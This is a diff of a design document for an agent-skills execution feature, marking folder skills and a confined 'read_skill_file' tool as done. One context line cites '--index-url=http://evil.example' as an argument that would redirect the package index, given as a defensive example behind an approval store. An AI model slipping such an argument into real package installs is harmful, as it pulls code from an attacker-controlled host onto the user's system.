@@ -199,7 +199,12 @@ With execution available, folder-shaped Agent Skills become usable, which needs:
    `--index-url=http://evil.example` would have redirected the package
    index. The approval store was generalised to
    `pending-approvals-store` to carry both kinds.
-6. **Folder skills + skill-relative reads** (§7).
+6. ~~**Folder skills + skill-relative reads** (§7)~~ **DONE** —
+   `<name>/SKILL.md` loads alongside flat `<name>.md`; bundled files are
+   listed (capped at 60, depth 3) and appended to the skill prompt; the
+   new `read_skill_file` tool is confined to the skill folder and is
+   passed the active skill explicitly rather than reading the chat store,
+   which would have been a circular import.
 7. Docs: skills.md gains an execution section; CHANGELOG.
 
 Steps 1–2 are pure safety work with no user-visible feature, and are worth doing
